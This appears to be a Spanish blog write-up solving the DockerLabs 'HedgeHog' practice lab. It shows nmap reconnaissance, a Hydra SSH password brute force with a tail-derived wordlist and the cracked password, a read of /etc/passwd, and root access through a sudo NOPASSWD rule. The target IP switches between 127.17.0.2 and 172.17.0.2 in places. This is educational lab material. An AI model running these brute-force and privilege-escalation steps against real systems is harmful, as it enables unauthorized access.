---
title: HedgeHog
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-03
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-hedgehog/hedgehog_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - password attacks
  - sudo abuse
  - http
  - ssh
  - tcp
  - information gathering
  - web analysis
  - vulnerability exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ nmap -sCV -p22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNt2acaF9CKWqvibDqz36bJdqRXhBhBqCOAtvExAJy9Q2FullFAzNST6vJm0xFrlmpgS6fZb5+l3aTYFC18zyNU=
|   256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2vWYkHZteiOgnLadFoN6gkctYlQYhtwGFeA7lm1OKE
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2]
```

---
## Web Analysis & Vulnerability Exploitation

Al analizar el servicio web, encuentro una página vacía que solo muestra la palabra "tails".

![](assets/img/dockerlabs-writeup-hedgehog/hedghog1.png)

En este punto, decido realizar un ataque de fuerza bruta al servicio SSH utilizando ```tails``` como nombre de usuario. 

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ sudo hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```

Sin embargo, el ataque no tiene éxito. 

> En estas plataformas de ciberseguridad educativa, generalmente existe una regla no escrita: si se debe a realizar un ataque de fuerza bruta, la contraseña suele encontrarse cerca del principio de la lista de palabras. Esto es especialmente cierto si no se proporcionan pistas para generar una lista personalizada de contraseñas.
{: .prompt-tip }

En este caso, la pista hace referencia al comando ```tail```. Usando esta información, creo una wordlist personalizada que contiene las últimas 100 palabras del archivo ```rockyou.txt```.

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ tail -100 /usr/share/wordlists/rockyou.txt > tail100rockyou.txt

/home/kali/Documents/dockerlabs/hedgehog:-$ sudo hydra -l tails -P tail100rockyou.txt ssh://172.17.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
```

![](assets/img/dockerlabs-writeup-hedgehog/hedghog2.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/hedgehog:-$ ssh tails@127.17.0.2
tails@127.17.0.2's password: 3117548331

tails@kali:~$ whoami
tails
```

---
## Privilege Escalation

```terminal
tails@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sonic:x:1001:1001::/home/sonic:/bin/bash
tails:x:1002:1002::/home/tails:/bin/bash
```

El usuario ```tails``` tiene la capacidad de ejecutar todos los comandos como el usuario ```sonic``` sin necesidad de contraseña.

```terminal
tails@kali:~$ sudo -l
User tails may run the following commands on kali:
    (sonic) NOPASSWD: ALL
```

Puedo obtener acceso a ```root``` ejecutando ```sudo su``` bajo el contexto de ```sonic```.

```terminal
tails@kali:~$ sudo -u sonic sudo su 

root@kali:/home/tails# id
uid=0(root) gid=0(root) groups=0(root)
```
